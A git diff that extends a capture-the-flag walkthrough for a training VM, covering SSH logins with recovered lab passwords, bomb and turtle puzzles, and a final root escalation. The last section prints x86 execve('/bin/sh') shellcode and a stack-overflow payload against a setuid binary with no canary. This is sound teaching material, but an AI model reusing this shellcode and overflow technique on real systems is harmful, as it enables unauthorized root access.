@@ -177,9 +177,98 @@ The first letter of the password is therefore I. We repeat this operation for th
 
 This gives us: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
-### SSH
+Try to connect in ssh :
+
+- **login**    : `laurie`
+- **password** : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+
+``ssh laurie@192.168.56.101``
+
+### SSH -Laurie
 ![alt text](images/ssh_laurie.png)
 
+We have a README file that asks us to distribute the bomb to obtain the user's password.
+
+To simplify this puzzle, we will use `SCP` to copy the bomb binary so we can disassemble it on **GHIDRA**.
+
+![alt text](images/Difuse_Bomb.png)
+
+![alt text](images/ghydra.png)
+
+A series of six puzzles is presented to us, and we must solve them to find Thor's password!
+
+![alt text](images/bomb_difused.png)
+
+As the README tells us, if we take all the correct answers and remove the spaces, we get Thor's password:
+
+- **login**    : `thor`
+- **password** : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 
-*To be documented...*
+### SSH - Thor
+
+![alt text](images/thor_login.png)
+
+**README** : _Finish this challenge and use the result as password for 'zaz' user._
+
+**GAME** : _turtle_
+
+![alt text](images/turtle_game.png)
+
+The turtle file wrote a word if we reconstructed the steps described in the file, and that word was `SLASH`.
+![alt text](images/SLASH.png)
+
+At the end of the turtle file, the **digest** index means that we need to perform an MD5 (message digest) on `SLASH`.
+
+![alt text](images/md5sum.png)
+
+
+We can connect to zaz!
+
+- **login**    : `zaz`
+- **password** : `646da671ca01bb5d84dbb5fb2238dc8e`
+
+
+### SSH - Zaz
+
+![alt text](images/zaz_login.png)
+
+We've reached the final exploit! We have a binary with a set_uid of `ROOT`! Looking at the program's security, we see that there is no canary, so we can potentially overflow the program and execute a shell with root privileges!
+
+![](images/cannary_file.png)
+
+#### step_1 : StackOverflow- nop slide
+
+We need shellcode that we will put in the environment and use in the EIP overflow.
+
+![alt text](images/shell_code.png)
+
+We retrieved a shell code from the Shellstorm website that is compatible with our system.
+
+``\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80``
+
+![alt text](images/export_shellcode.png)
+
+We need to retrieve the address of our shellcode in the environment from the program using gdb.
+
+adresse: `0xbffffb63`
+
+##### calcul offset
+
+![alt text](images/OFSSET_gdb.png)
+
+With our pattern, we can see that the eip overflows at `jjjj` [0x6a6a6a6a].
+
+offset = `140`
+
+##### Payload
+
+Now all we have to do is execute our payload!
+``./exploit_me $(python -c 'print "A"*140 + "\xbf\xff\xfb\x63"[::-1]')``
+
+![alt text](images/payload.png)
+
+**_Congratulation you'are root !_**
+
+
+# END
